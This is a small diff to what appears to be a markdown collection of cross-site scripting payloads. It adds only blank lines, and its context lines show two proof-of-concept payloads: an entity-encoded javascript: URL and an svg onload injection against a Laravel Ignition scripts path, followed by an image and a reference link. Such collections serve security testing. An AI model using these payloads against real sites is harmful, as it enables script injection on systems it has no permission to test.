@@ -167,5 +167,7 @@ url=%26%2302java%26%23115cript:alert(document.domain)
 ```js
 host+/_ignition/scripts/--%3E%3Csvg%20onload=alert('XSS')%3E
 ```
+
 ![img](https://pbs.twimg.com/media/F-pD1E9bYAAo8IB?format=jpg&name=small)
+
 [Ref](https://x.com/momika233/status/1723264646940082330?s=20)
